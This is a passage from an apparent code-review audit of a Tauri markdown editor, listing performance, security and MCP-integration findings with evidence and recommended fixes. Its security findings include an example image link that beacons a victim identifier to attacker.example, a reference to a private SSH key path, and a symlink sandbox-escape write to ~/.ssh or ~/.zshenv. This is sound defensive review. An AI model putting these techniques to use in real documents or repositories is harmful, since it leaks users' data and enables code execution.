- `src/plugins/codemirror/sourceCursorContext.ts:10`
- `src/plugins/sourceContextDetection/cursorContext.ts:190`

**Evidence:** createSourceCursorContextPlugin (sourceCursorContext.ts:10) calls computeSourceCursorContext on every selectionSet/docChanged update; cursorContext.ts:190-218 invokes ~12 detectors. Two are pathological: (1) getCodeFenceInfo's backward scan (codeFenceDetection.ts:48-67) walks from the cursor to line 1 when the cursor isn't in a fence, and for each fence-pattern line calls isOpeningFence, which itself counts fences from line 1 to that line (codeFenceDetection.ts:144-149) — O(fences × lines) per cursor move; with a found opening it then scans forward to doc end (line 77). (2) getBlockMathInfo (blockMathDetection.ts:36-48) scans from the cursor up to line 1 whenever no `$$` exists above — i.e., for every cursor position in a math-free document, every selection change scans all preceding lines. At line 50,000 of a large doc, every keystroke and arrow key pays a 50,000-line scan in blockMath alone, plus the fence scan.

**Recommendation:** Use the Lezer markdown syntax tree that source mode already builds (`@codemirror/lang-markdown` is the configured language): `syntaxTree(state).resolveInner(pos)` identifies FencedCode/Math/Table/List/Blockquote ancestry in O(log n), replacing the hand-rolled line scans in codeFenceDetection and blockMathDetection. If a tree-based rewrite is too broad for one pass, at minimum memoize the fence-parity prefix per doc identity (docs are immutable) so isOpeningFence stops re-counting from line 1.

### #21 · P2/M · Footnote appendTransaction performs two full document walks on every keystroke once a document contains any footnote

**Status:** finder-evidence (not adversarially cross-checked)

**Files:**
- `src/plugins/footnotePopup/tiptap.ts:365`
- `src/plugins/footnotePopup/tiptap.ts:369`
- `src/plugins/footnotePopup/tiptap.ts:374`
- `src/plugins/footnotePopup/tiptapCleanup.ts:22`

**Evidence:** tiptap.ts:359-366 — the hasFootnotesCache fast path only short-circuits when the doc has NO footnotes. When hasFootnotesCache is true, every docChanged transaction falls through to docContainsFootnotes(newState.doc) (early-exit walk, tiptap.ts:118-128), then collectFootnoteNodes(newState.doc) at line 369 AND collectFootnoteNodes(oldState.doc) at line 374 — both full `doc.descendants` traversals with no early exit (tiptapCleanup.ts:31-40) — just to detect whether a ref was deleted. A long document with a single footnote pays 2+ full tree walks per keystroke in WYSIWYG mode.

**Recommendation:** Cache the collected refs/defs positions in plugin state keyed by doc identity, map positions through tr.mapping on each transaction, and only re-collect when a transaction's deleted/inserted step ranges intersect a known footnote position (the changesIntersectRanges helper pattern already exists in codePreview/tiptap.ts). The ref-deleted check then becomes O(steps × footnotes) instead of O(doc) twice.

### #22 · P2/S · Cross-mode undo stack retains up to 50 full markdown snapshots per tab with no byte cap — hundreds of MB on large docs

**Status:** finder-evidence (not adversarially cross-checked)

**Files:**
- `src/stores/documentStore/unifiedHistory.ts:87`
- `src/stores/documentStore/unifiedHistory.ts:16`
- `src/hooks/useUnifiedHistory.ts:81`

**Evidence:** unifiedHistory.ts:16-25 — each HistoryCheckpoint stores the FULL markdown string; useUnifiedHistory.ts:81-84 creates one on every WYSIWYG⇄Source mode switch (plus pushRedo/pushUndo on every unified undo/redo). The only cap is MAX_CHECKPOINTS = 50 per tab (line 87), count-based, applied independently to undo and redo stacks (up to 100 snapshots total per tab). For a 5 MB document (allowed by largeFileRouting up to 50 MB), 50 mode toggles retain ~500 MB of JS heap (UTF-16 doubles the byte size). Dedup (line 104-107) only skips consecutive identical content; alternating edits between modes defeats it. Memory persists until tab close (clearDocument).

**Recommendation:** Add a per-tab byte budget (e.g., sum of checkpoint.markdown.length capped at ~20 MB, evicting oldest), and skip checkpoint creation entirely above a doc-size threshold (mirroring SHOW_INVISIBLES_DOC_SIZE_LIMIT-style graceful degradation) — cross-mode undo silently degrades to native per-mode history for huge files.

### #23 · P2/S · StatusBarCounts recomputes full text metrics (12-regex strip + full code-point array) on every content flush

**Status:** finder-evidence (not adversarially cross-checked)

**Files:**
- `src/components/StatusBar/StatusBarCounts.tsx:49`
- `src/components/StatusBar/statusTextMetrics.ts:5`
- `src/components/StatusBar/statusTextMetrics.ts:84`

**Evidence:** StatusBarCounts.tsx:49-52 — `computeTextMetrics(stripMarkdown(deferredContent))` runs in a useMemo keyed on the document content. stripMarkdown (statusTextMetrics.ts:5-20) is 13 chained full-string regex replaces; computeTextMetrics (lines 84-103) does `Array.from(plainText)` (allocates one array element per code point — millions for a 1 MB doc), two more full-string replaces, two more Array.from calls, a global CJK regex match, and an alfaaz word count. useDeferredValue lowers the React priority but the useMemo body is synchronous and non-interruptible once the deferred render starts — on a 1-2 MB doc that's a tens-of-ms main-thread block per content change. In source mode (finding 1) content changes per keystroke, so this fires continuously while typing; in WYSIWYG it fires on every debounce flush.

**Recommendation:** Gate by content size: above ~200 KB, compute metrics on a trailing throttle (e.g., at most once per 500 ms via setTimeout in an effect, not useMemo) and show the last computed value meanwhile. Optionally compute only words/charsNoSpaces inline and defer the full breakdown (cjkChars, charsNoPunctuation) until the WordCountPopover actually opens.

### #24 · P2/S · The 1.22 MB entry chunk has no size-limit budget, and the vendor-mermaid/vendor-graph budgets are mislabeled EAGER (they are now lazy)

**Status:** finder-evidence (not adversarially cross-checked)

**Files:**
- `.size-limit.cjs:110`
- `vite.config.ts:104`

**Evidence:** I verified against the local dist build: dist/index.html's modulepreload list contains only vendor-react/tiptap/state/tauri/markdown/lezer/codemirror/dompurify, and the entry chunk's static imports match — vendor-mermaid (1.67 MB) and vendor-graph (644 KB) are referenced only as dynamic imports. The dompurify isolation in vite.config.ts:104-110 fixed the eager-mermaid problem the .size-limit.cjs comments describe, but the config still labels both "EAGER:" with prose claiming they're preloaded on cold start. Meanwhile the actual entry chunk (index-D3RErXKt.js, 1.22 MB — the single largest eagerly-executed chunk) has NO entry in module.exports, even though the file header comment explicitly describes an `index-BUAvxpLj*.js` budget that no longer exists. A regression that bloats the entry chunk (e.g., a lazy import becoming static and inlined) will not trip CI — exactly the failure mode the budget file exists to catch.

**Recommendation:** Add a budget entry for the entry chunk using the full-prefix glob technique the header already documents; relabel vendor-mermaid and vendor-graph as LAZY with a note pointing at the dompurify split; re-verify labels against dist/index.html's modulepreload list after the next build.

### #25 · P2/L · vendor-codemirror (1.03 MB) + vendor-lezer (618 KB) are statically imported by the entry chunk — ~40% of cold-start JS for surfaces that are nominally lazy

**Status:** finder-evidence (not adversarially cross-checked)

**Files:**
- `.size-limit.cjs:77`
- `src/components/Editor/SourceEditor.tsx:23`
- `src/plugins/sourcePeekInline/sourcePeekEditor.ts:1`

**Evidence:** Verified in the dist build: the entry chunk statically imports vendor-codemirror-DRyBFLwI.js (1,028,567 bytes) and vendor-lezer-DXyaau_j.js (618,009 bytes); both sit on index.html's modulepreload list. Yet SourceEditor is React.lazy (its own 145 KB chunk) — the CM core is dragged eager by static imports reachable from the always-mounted UI: toolbarActions source adapters (imported by UniversalToolbar), sourcePeekInline (in the eager tiptapExtensions assembly), and ~30 sourceContextDetection/source*Popup modules. The .size-limit.cjs comment at the vendor-codemirror entry acknowledges this ("Eager today; narrowing language-data is a separate (B5) win"). Together that's ~1.65 MB of the ~4 MB eager JS parsed/executed on every window open, including windows that never enter source mode or source peek.

**Recommendation:** Make the CM dependency graph lazy at its two real roots: (a) toolbarActions' source adapters — dispatch through a lazy `await import()` boundary keyed on mode (the mode-abstraction layer already separates sourceAdapter from wysiwygAdapter), and (b) sourcePeekInline — load its CM widget factory on first F5 invocation. Then vendor-codemirror/vendor-lezer fall out of the entry graph naturally. Verify with the modulepreload list and flip the size-limit tier labels.

### #26 · P3/S · smartBackspace/smartDelete flatten the entire document via doc.toString() per keypress to find a grapheme cluster break

**Status:** finder-evidence (not adversarially cross-checked)

**Files:**
- `src/plugins/codemirror/structuralCharProtection.ts:311`
- `src/plugins/codemirror/structuralCharProtection.ts:408`

**Evidence:** structuralCharProtection.ts:311 and :408 — `findClusterBreak(state.doc.toString(), head, …)` materializes the full document string to compute a cluster break adjacent to a single cursor. This branch runs for every non-structural cursor inside changeByRange whenever ANY cursor is at a structural position (table pipe / list marker / blockquote) — so holding Backspace in a table inside a large forced-source document performs one full O(doc) flatten per repeat, per non-structural cursor in multi-cursor mode.

**Recommendation:** Replace with a bounded slice: `state.doc.sliceString(Math.max(0, head - 64), Math.min(doc.length, head + 64))` and call findClusterBreak with the adjusted offset (grapheme clusters never span anywhere near 64 chars), or use the line text via `doc.lineAt(head)` with offset arithmetic since cluster breaks cannot span line breaks.

### #27 · P3/S · WindowContext.Provider value is a fresh object literal every render — un-memoized context value

**Status:** finder-evidence (not adversarially cross-checked)

**Files:**
- `src/contexts/WindowContext.tsx:448`

**Evidence:** WindowContext.tsx:448 — `<WindowContext.Provider value={{ windowLabel, isDocumentWindow }}>` creates a new object identity on each WindowProvider render, so every useWindowLabel/useIsDocumentWindow consumer (used in TiptapEditor, SourceEditor, StatusBar, useDocumentState's useActiveTabId — i.e., effectively the whole tree) re-renders whenever the provider re-renders, even when the label is unchanged. Impact is currently bounded because the provider's state settles after the bootstrap pipeline, but any future state added to WindowProvider silently turns into an app-wide re-render.

**Recommendation:** Wrap the value in `useMemo(() => ({ windowLabel, isDocumentWindow }), [windowLabel, isDocumentWindow])`. One-line hardening consistent with the codebase's selector-discipline conventions.

## Rust backend performance

Main-thread blocking in sync commands, watcher/event-coalescing gaps, and subprocess-pipeline hazards (including one deadlock).

### #28 · P1/M · Synchronous Tauri commands run login-shell spawns, subprocess detection, 50MB writes, and keychain IPC on the main thread

**Status:** finder-evidence (not adversarially cross-checked)

**Files:**
- `src-tauri/src/lib.rs:342`
- `src-tauri/src/lib.rs:205`
- `src-tauri/src/pandoc/commands.rs:77`
- `src-tauri/src/secure_store.rs:72`
- `src-tauri/src/external_editor.rs:193`
- `src-tauri/src/quarantine.rs:134`
- `src-tauri/src/watcher.rs:182`
- `src-tauri/src/workspace.rs:321`
- `src-tauri/src/ai_provider/detection.rs:135`

**Evidence:** Tauri v2 executes non-async commands on the main thread; the project itself documents this hazard (file_tree.rs:50-51 'async + spawn_blocking ... runs off the IPC thread (O4 / WI-2.3)', and detect_ai_providers was converted in O2/WI-2.2). But several heavy commands remain sync `pub fn`: (1) `get_login_shell_path` (lib.rs:342-345) — first call runs `run_login_shell_capture` (detection.rs:135-179): spawns `$SHELL -lic`, polls `try_wait` in a 50ms sleep loop with a 5s timeout. Called from spawnPty.ts:168 on every terminal open and actionlint.ts:28 — with nvm/pyenv shell configs the first terminal open freezes the entire app (menus, window drag, all IPC) for 0.5–5s. (2) `write_temp_html` (lib.rs:205-238) — writes up to 50MB of export HTML plus a readdir+stat+unlink cleanup pass, called from pdfExportWindow.ts:65 at the start of every PDF export. (3) `detect_pandoc` (pandoc/commands.rs:77-104) — spawns `which pandoc` + `pandoc --version` (plus first-call login-shell resolution via login_shell_path()), called from pandocExport.ts:71 on every pandoc export and FilesImagesSettings.tsx:266. (4) `set_secret`/`get_secret`/`delete_secret` (secure_store.rs:72-99) — keyring OS IPC; the file header itself documents that dev builds can trigger a blocking keychain prompt. (5) `open_in_external_editor` (external_editor.rs:193-264) — canonicalize + process spawn + `login_shell_path()` (potentially the 5s first call). (6) `strip_workspace_quarantine_cmd` (quarantine.rs:134) — readdir + per-file stat + xattr removal at workspace open; each call is a network round-trip on /Volumes. (7) `start_watching` (watcher.rs:182) — recursive watcher setup (tree walk on Linux inotify). (8) `read/write_workspace_config` (workspace.rs:321-379) — JSON IO through app_paths::atomic_write_file which fsyncs (app_paths.rs:93).

**Recommendation:** Convert these commands to `async fn` + `tokio::task::spawn_blocking`, exactly matching the existing pattern in file_tree.rs (list_directory_entries), content_search.rs (search_workspace_content), and ai_provider/detection.rs (detect_ai_providers). Highest-value first: get_login_shell_path, detect_pandoc, write_temp_html, the three secure_store commands, open_in_external_editor. None of them need the main thread (no AppKit/menu/window APIs).

### #29 · P1/M · File-explorer tree loads via sequential per-directory IPC recursion, and every fs:changed event (including plain saves) triggers a full re-walk with no coalescing

**Status:** finder-evidence (not adversarially cross-checked)

**Files:**
- `src/components/Sidebar/FileExplorer/useFileTree.ts:57`
- `src/components/Sidebar/FileExplorer/useFileTree.ts:179`
- `src/utils/fsEventFilter.ts:36`
- `src/stores/workspaceStore.ts:84`
- `src-tauri/src/file_tree.rs:56`

**Evidence:** loadDirectoryRecursive (useFileTree.ts:57-102) awaits one `invoke("list_directory_entries")` per directory, serially inside a for-loop — a workspace with N directories costs N sequential IPC round-trips per tree load (hundreds of ms to seconds on real workspaces). The fs:changed listener (useFileTree.ts:179-184) calls loadTree() — a full root re-walk — for every passing event; shouldRefreshTree (fsEventFilter.ts:36-60) filters only by watchId and path prefix, NOT by event kind, so every 'modify'/'rename' event (i.e. every save of any workspace file, including VMark's own atomic-write renames whose target path passes the temp-file filter in watcher.rs:98-118) triggers a complete tree reload. The requestId guard (useFileTree.ts:141,152) discards stale results but not stale work — a burst of events (git checkout, build output) launches many concurrent full recursive walks. DEFAULT_EXCLUDED_FOLDERS is only ['.git','node_modules'] (workspaceStore.ts:84), so target/, dist/, .next/ are fully walked and their .js/.ts/.css/.html entries are now supported formats (Phase 1B), multiplying tree size.

**Recommendation:** Three coordinated changes: (1) add a Rust `list_directory_tree` command that performs the recursive walk in one pass (reuse the bounded-walker shape from content_search.rs: excludeFolders, symlink skip, entry cap) and returns the nested tree in a single IPC round trip; (2) debounce/coalesce loadTree on the frontend (e.g. 250ms trailing) so event bursts collapse into one reload; (3) skip pure 'modify' events in shouldRefreshTree — file content changes don't alter tree structure (create/remove/rename do).

### #30 · P2/M · Watcher debounce is leading-edge-only — the trailing event in a burst is dropped, so the last external change within 200ms is never delivered

**Status:** finder-evidence (not adversarially cross-checked)

**Files:**
- `src-tauri/src/watcher.rs:126`
- `src-tauri/src/watcher.rs:137`
- `src/hooks/useExternalFileChanges.ts:384`

**Evidence:** handle_event (watcher.rs:126-174) suppresses any event for a (watch_id, path) key seen within DEBOUNCE_INTERVAL (200ms) — it drops the later event instead of deferring it. Two external writes to the same file <200ms apart: the first event fires (frontend reads disk, possibly mid-write state), the second is silently discarded, so useExternalFileChanges.ts never sees the final content. The file tree has a window-focus fallback (useFileTree.ts:208-231) but open-document external-change handling has none — the editor can show stale content until the next unrelated event. Additionally, the prune at watcher.rs:137-140 runs a full O(n) map.retain on every event once the map exceeds 100 entries (and retains everything younger than 10 minutes, so during a busy burst it scans thousands of entries per event on the notify callback thread, delaying delivery). Each path also allocates a fresh (watch_id.to_string(), path.clone()) key per event (lines 147-148).

**Recommendation:** Replace the hand-rolled leading-edge filter with deferred trailing-edge coalescing: either adopt notify-debouncer-mini (already in the notify ecosystem) or buffer paths in the callback and flush a single coalesced fs:changed per watch_id every 200ms from a small timer thread. This simultaneously fixes the dropped-trailing-event staleness, batches event storms into one emit (complementing the file-tree fix), and removes the per-event retain scan (prune on flush instead).

### #31 · P2/S · content_search issues 3 redundant stat syscalls per directory entry and opens every candidate file twice, shrinking what the 5s deadline can cover

**Status:** finder-evidence (not adversarially cross-checked)

**Files:**
- `src-tauri/src/content_search.rs:348`
- `src-tauri/src/content_search.rs:381`
- `src-tauri/src/content_search.rs:170`

**Evidence:** Per directory entry the walker calls path.symlink_metadata() (line 348, lstat), path.is_dir() (line 352, stat), and path.is_file() (line 356, stat) — three syscalls where DirEntry::file_type() is free (d_type from readdir, as file_tree.rs:84 itself notes). Per candidate file: is_binary() opens the file and reads 8KB (line 381) BEFORE the size check at line 386 stats it again (so a 2GB file is opened and read before being skipped), then read_to_string (line 398) opens it a third time. On a 50k-entry workspace that is ~150k avoidable syscalls plus a doubled open count per searched file — and since the search has a hard 5s wall-clock deadline that returns partial results (lines 318-323, 441-446), the waste directly reduces how many files get searched before truncation. Secondary: byte_offset_to_char_index (line 170) rescans the line prefix per match range — O(line_len × matches) on long match-dense lines — and counts Unicode scalar values while the doc comment promises UTF-16 code units, so astral-plane characters (emoji) misalign highlight offsets in JS.

**Recommendation:** Use entry.file_type() once per entry (covers symlink/dir/file in zero extra syscalls); fetch size via entry.metadata() before any open; read each candidate file once into Vec<u8>, NUL-check the first 8KB, then String::from_utf8 — one open, one read, one stat per file. Make the char-index conversion a single forward pass over the line shared by all ranges (and decide whether the contract is scalar values or UTF-16 units, fixing comment or code).

### #32 · P2/S · run_pandoc writes the full document to stdin before starting the stderr drain — pipe-buffer deadlock hangs the export forever (no timeout covers the write phase)

**Status:** finder-evidence (not adversarially cross-checked)

**Files:**
- `src-tauri/src/pandoc/commands.rs:207`
- `src-tauri/src/pandoc/commands.rs:219`
- `src-tauri/src/pandoc/commands.rs:158`

**Evidence:** In run_pandoc, stdin.write_all(markdown) (lines 208-213) completes before the stderr drain thread is spawned (lines 219-227), and the PANDOC_TIMEOUT polling loop (lines 230-264) only starts after the write returns. If pandoc emits more than the ~64KB pipe buffer to stderr while still consuming stdin (large document with many warnings — e.g. hundreds of unresolvable image references with --resource-path), pandoc blocks on its stderr write, stops reading stdin, and our write_all blocks permanently. The 120s timeout never fires because it hasn't started; export_via_pandoc (lines 158-164) awaits the spawn_blocking task with no outer tokio::time::timeout, so the frontend export await hangs forever and the blocking-pool thread is leaked. The code's own comment at 215-218 identifies exactly this deadlock class but the ordering doesn't protect the stdin-write phase.

**Recommendation:** Spawn the stderr drain thread before writing stdin (move lines 219-227 above 207-213), and/or move the stdin write to its own thread like stderr. Optionally wrap the spawn_blocking await in export_via_pandoc with tokio::time::timeout(PANDOC_TIMEOUT + margin) as a backstop so no code path can hang the UI indefinitely.

### #33 · P3/S · detect_pandoc has no cache and the pandoc path is re-resolved per export — 3 subprocess spawns on every pandoc export

**Status:** finder-evidence (not adversarially cross-checked)

**Files:**
- `src-tauri/src/pandoc/commands.rs:78`
- `src-tauri/src/pandoc/commands.rs:154`
- `src/export/pandocExport.ts:71`

**Evidence:** pandocExport.ts:71 invokes detect_pandoc before every export; detect_pandoc (commands.rs:78-104) runs `which pandoc` + `pandoc --version` (a large Haskell binary — cold start commonly 100-300ms) with no memoization, then export_via_pandoc calls resolve_pandoc_path() again (line 154) spawning `which` a third time. Contrast with ai_provider/detection.rs:21 where DETECTION_CACHE was added for exactly this reason ('repeated detect_ai_providers calls otherwise re-spawn which/where ×3 every time (O2)'). Until the sync-command finding is fixed, all of this also runs on the main thread.

**Recommendation:** Memoize PandocInfo in a OnceLock/Mutex cache mirroring DETECTION_CACHE (installed CLIs don't change mid-session — the same rationale as O2), and have export_via_pandoc reuse the cached resolved path instead of re-running which.

### #34 · P3/S · PDF export adds ≥1.3s of fixed polling latency after the print operation completes

**Status:** finder-evidence (not adversarially cross-checked)

**Files:**
- `src-tauri/src/pdf_export/renderer.rs:362`
- `src-tauri/src/pdf_export/renderer.rs:114`

**Evidence:** print_to_pdf's stabilization loop (renderer.rs:362-409) never checks the output file before tick 6 (`if i > 5` with 0.1s ticks = 700ms floor), then requires 5 consecutive stable-size ticks (500ms) plus a 0.2s final recheck — a minimum of ~1.4s after runOperationModalForWindow returns, on every export, even when the PDF is fully written immediately. load_html_and_wait (lines 114-120) similarly enforces `i > 2` (150ms floor) plus a fixed 0.2s settle. The main-thread/NSRunLoop design itself is documented and deliberate (GCD deadlock); only the polling parameters are wasteful.

**Recommendation:** Check the file from tick 0, shrink the stable window (2 ticks at 50ms is ample for a local rename-style flush — keep the existing 60s ceiling as the timeout), and drop the load-wait floor to i > 0. Cuts >1s off every PDF export with no behavior change.

### #35 · P3/S · Async commands run blocking subprocess polling and filesystem IO directly on tokio workers

**Status:** finder-evidence (not adversarially cross-checked)

**Files:**
- `src-tauri/src/shell_integration.rs:40`
- `src-tauri/src/ai_provider/detection.rs:135`
- `src-tauri/src/pandoc/commands.rs:154`

**Evidence:** prepare_shell_integration (shell_integration.rs:40-69) is async but synchronously does create_dir_all + atomic rc write, then calls login_shell_zdotdir → run_login_shell_capture (detection.rs:135-179), which spawns a login shell and polls try_wait in a 50ms std::thread::sleep loop for up to 5s — all inline on a tokio worker thread. export_via_pandoc (pandoc/commands.rs:154) calls resolve_pandoc_path (blocking Command::output) and Path::canonicalize (line 135) on the worker before reaching its spawn_blocking. Blocking a worker for 5s degrades every other in-flight async command (MCP bridge routing, hot-exit capture timeouts share the same runtime).

**Recommendation:** Wrap the blocking bodies in tokio::task::spawn_blocking (prepare_shell_integration's whole body after the path resolution; resolve_pandoc_path + canonicalize inside export_via_pandoc's existing spawn_blocking closure). Same pattern the file already uses further down.

### #36 · P3/S · MCP bridge deep-clones the full request payload (including MB-scale document.write content) on every request

**Status:** finder-evidence (not adversarially cross-checked)

**Files:**
- `src-tauri/src/mcp_bridge/server.rs:542`

**Evidence:** handle_client_message parses every request via `McpRequest::from_value(msg.payload.clone())` (server.rs:542). from_value (types.rs:25) takes the Value by value, so the clone deep-copies the entire JSON payload; for document.write/transform the args carry the full document markdown, so a 5MB document costs a 5MB serde_json::Value deep clone per request — and writes serialize through the global write lock, so the clone sits on the critical path. After this line, msg is only used for msg.id (already cloned separately at line 611).

**Recommendation:** Take the payload by move: make msg mutable and pass `std::mem::take(&mut msg.payload)` to from_value (or destructure WsMessage into id/msg_type/payload upfront). One-line change, removes the largest allocation on the MCP write path.

## Security

Defensive review of the sandbox, capability surface, CSP, and secret paths. One verified sandbox escape; the rest are hardening.

### #37 · P1/S · Workflow sandbox escapes via a symlinked directory when the write target does not yet exist

**Status:** independently verified (code re-read in orchestrating session)

**Files:**
- `src-tauri/src/workflow/sandbox.rs:34`
- `src-tauri/src/workflow/runner.rs:830`

**Evidence:** validate_path() only resolves symlinks and re-checks containment when `normalized.exists()` (sandbox.rs lines 35-50). For a non-existent target it returns the textually-normalized path WITHOUT canonicalizing — yet the file header claims it 'Rejects ... symlinks that escape'. The `action/save-file` handler (runner.rs:834-845) then calls create_dir_all(parent) and tokio::fs::write(&path, input) on that path. If the workspace contains a symlinked directory pointing outside it (e.g. a cloned repo with `docs -> ~/.ssh` — git checks out symlinks by default), a workflow doing `save-file path: docs/authorized_keys` passes the textual `starts_with(workspace_root)` check, then create_dir_all/write follow the symlink and write outside the sandbox. Reads are safe because the target must exist and hits the canonicalize branch; only new-file writes are exposed. Result: arbitrary file write within the user's permissions from an untrusted workspace + a user-run workflow (e.g. overwrite ~/.zshenv -> code execution).

**Recommendation:** Before returning a non-existent normalized path, canonicalize the nearest existing ancestor directory (the parent that must exist for the write) and re-check it starts_with the canonicalized workspace root; reject if it escapes. Add a test with a symlinked intermediate directory and a non-existent leaf.

### #38 · P2/S · atomic_write_file command ignores the fs capability allow-list and can write to any absolute path

**Status:** finder-evidence (not adversarially cross-checked)

**Files:**
- `src-tauri/src/lib.rs:271`
- `src-tauri/src/lib.rs:329`

**Evidence:** atomic_write_file_sync (lib.rs:271-319) only enforces `no ParentDir component` and `is_absolute()`. It performs no containment to the declared fs scope. The capabilities file (capabilities/default.json) deliberately limits plugin fs writes to $HOME/**, /Volumes/**, /mnt/**, /media/** and states 'Path traversal attacks are mitigated at the application layer', but this custom command bypasses that allow-list entirely: any absolute path the process user can write (e.g. /private/tmp, /usr/local, /opt) is accepted as long as it contains no `..`. A compromised renderer thus has a broader write primitive than the fs plugin grants. (Note: app commands registered via generate_handler! are not gated by the per-window capability ACL the way plugin/core commands are, so the 'UI-only, no filesystem' settings window can also reach this command — worth verifying and guarding.)

**Recommendation:** Constrain atomic_write_file's target to the same roots the fs capability allows (or resolve it through tauri_plugin_fs scope / app.fs_scope().is_allowed), rejecting paths outside the declared scope. Consider a window-label check so restricted windows cannot invoke it.

### #39 · P2/S · pdf-export window capability grants broad $HOME/** write despite claiming read-only temp access

**Status:** finder-evidence (not adversarially cross-checked)

**Files:**
- `src-tauri/capabilities/pdf-export.json`

**Evidence:** The pdf-export capability description reads '...read-only access to app temp files. No shell, PTY, MCP, or broad filesystem access.' but the permissions list includes `fs:allow-write-file` with `{path: $HOME/**}` and `{path: /Volumes/**}`. That is broad home-directory write access, directly contradicting the stated least-privilege intent. The PDF save itself flows through the Rust export_pdf / write_temp_html commands (services/export pipeline), so the off-screen pdf-export webview appears not to need blanket $HOME write at all.

**Recommendation:** Remove the $HOME/** and /Volumes/** write grants from pdf-export.json (the Rust export commands and dialog scope already cover the save), or narrow to the specific temp/export directory actually written from JS. Reconcile the description with the granted permissions.

### #40 · P2/S · MCP bridge auth token is derived from non-cryptographic RandomState/SipHash, with a false 'independent random' comment

**Status:** finder-evidence (not adversarially cross-checked) · same root cause as #51

**Files:**
- `src-tauri/src/mcp_bridge/state.rs:111`

**Evidence:** generate_auth_token() builds the 64-hex bearer token by calling std::collections::hash_map::RandomState::new() four times and hashing the (known) process id with each. The comment says 'Generate 4 independent random u64s (32 bytes total)' but std's RandomState caches a per-thread (k0,k1) seed and only increments k0 by 1 per instance — so the four outputs are NOT independent; the whole token's entropy is the single 128-bit seed, and its unpredictability relies entirely on an undocumented, non-contractual std implementation detail of a hash function explicitly not designed as a CSPRNG. This token is the sole guard on a WebSocket bridge that lets a client read and overwrite open documents and save to disk.

**Recommendation:** Generate the token from a real CSPRNG (getrandom — already in the dependency tree via Tauri — or rand's OsRng) writing 32 random bytes as hex. Fix the misleading comment.

### #41 · P2/M · Production CSP allows remote images (img-src https: http:), so opening an untrusted document beacons to attacker servers

**Status:** finder-evidence (not adversarially cross-checked)

**Files:**
- `src-tauri/tauri.conf.json:29`

**Evidence:** The app security CSP is `default-src 'self'; script-src 'self'; img-src 'self' asset: https://asset.localhost blob: data: https: http:; style-src 'self' 'unsafe-inline'`. Markdown/HTML documents are untrusted input; an `![](https://attacker.example/x.png?u=victim)` (or http: cleartext) fires a network request the moment the document renders in WYSIWYG, leaking the user's IP, timing, and a 'document opened' signal — and over `http:` the request is observable to any network eavesdropper. This contradicts VMark's local-first / 'no cloud, no analytics' promise and gives a document author a reliable read-receipt / deanonymization beacon.

**Recommendation:** Gate remote image loading behind the existing workspace trust prompt (block remote img-src by default, allow per-document/workspace), or proxy/strip remote images. At minimum drop `http:` so cleartext beacons are blocked.

### #42 · P2/M · AI provider API keys round-trip through the renderer JS heap and IPC args instead of staying Rust-side

**Status:** finder-evidence (not adversarially cross-checked)

**Files:**
- `src/services/secrets/apiKeySecrets.ts:52`
- `src/stores/aiStore/provider.ts:378`
- `src/hooks/useGenieInvocation.ts:364`

**Evidence:** RW-16 moved API keys to the OS keychain, but readApiKey() invokes get_secret and returns the plaintext key to JS (apiKeySecrets.ts:56-61); provider.ts:378 stores it in the Zustand aiStore, and useGenieInvocation.ts:359-367 (and useWorkflowExecution.ts:130) pass `apiKey` straight back to Rust as an invoke() argument on every run_ai_prompt call. The secret therefore lives in the renderer heap for the whole session and crosses the IPC boundary repeatedly, exposed to DevTools heap snapshots, JS-exception serialization, and crash dumps — undercutting most of the at-rest benefit the keychain was added for. secure_store.rs already exposes the key to Rust directly, so the renderer round-trip is avoidable.

**Recommendation:** Have the Rust ai_provider read the key from the keychain (by provider id) at call time and never return get_secret's value to the webview for keys that Rust consumes; keep only a non-secret 'is configured' boolean in the store. Reserve get_secret-to-JS for cases the renderer genuinely must display.

### #43 · P3/M · Asset-protocol scope is **/* and media resolution loads any absolute path from document content

**Status:** finder-evidence (not adversarially cross-checked)

**Files:**
- `src-tauri/tauri.conf.json:32`
- `src/services/media/resolveMediaSrc.ts:82`

**Evidence:** assetProtocol.scope is `["**/*"]`, granting the asset:// protocol read of any file on disk. resolveMediaSrc() (resolveMediaSrc.ts:82-83) passes any isAbsolutePath() src straight to convertFileSrc() with no allow-list — validateImagePath is only applied to relative paths. So document content like `![](/Users/victim/.ssh/id_rsa)` or `<img src=/etc/...>` is resolved into a loadable asset URL. Content can't be exfiltrated by an <img> decode failure, but it lets untrusted documents probe for / reference arbitrary local files and broadens the asset surface well beyond the user's document tree.

**Recommendation:** Narrow assetProtocol.scope to the workspace/document directories actually needed, and apply a containment check to absolute media paths in resolveMediaSrc (reject paths outside the active document's directory tree / workspace unless explicitly trusted).

### #44 · P3/S · Quarantine strip removes Gatekeeper com.apple.quarantine from workspace documents broadly

**Status:** finder-evidence (not adversarially cross-checked)

**Files:**
- `src-tauri/src/quarantine.rs:59`

**Evidence:** strip_workspace_quarantine() removes com.apple.quarantine from the workspace root and every depth-1 file whose extension is in SUPPORTED_EXTENSIONS — which includes html/htm and svg (lib.rs SUPPORTED_EXTENSIONS). This runs on workspace open (frontend openWorkspaceWithConfig). Stripping the quarantine xattr disables macOS Gatekeeper's 'downloaded file' prompts for those files, so a later double-click opens a downloaded .html/.svg in the default browser/app without the Gatekeeper warning the OS would otherwise show — VMark silently weakens an OS protection on the user's files to work around a Finder re-open issue.

**Recommendation:** Limit the strip to the minimum needed for the Finder re-open path (ideally the root directory only, or only the file VMark is opening), and exclude active-content formats (html/htm/svg) from the strip so their Gatekeeper status is preserved.

## MCP / AI integration

The AI surface is the newest subsystem and shows it: addressing bugs across windows/tabs, timeout mismatches between the three layers, and contract drift.

### #45 · P1/S · MCP read-only guard checks the active document, not the targeted tab — read-only docs writable via tabId, writable docs falsely blocked

**Status:** finder-evidence (not adversarially cross-checked)

**Files:**
- `src/hooks/mcpBridge/handleRequest.ts:26`
- `src/services/editor/readOnlyGuard.ts:27`
- `src/hooks/mcpBridge/v2/document.ts:255`

**Evidence:** handleRequest.ts:26-47 gates the four write ops (vmark.document.write/transform, workflow.apply_patch, selection.set) on isActiveDocReadOnly(), which resolves only the ACTIVE tab of the current window (readOnlyGuard.ts:27-31). But handleDocumentWrite/handleDocumentTransform accept an arbitrary `tabId` and resolveTab (v2/document.ts:90-126) happily targets background tabs; neither handler calls isDocReadOnly(resolved.tabId). Consequence: (a) a read-only background tab can be fully overwritten AND persisted to disk by an AI client (writeTextFile at document.ts:343) while the guard passes because the active tab is writable; (b) conversely, when the active tab is read-only, writes to any other writable tab are rejected with READ_ONLY.

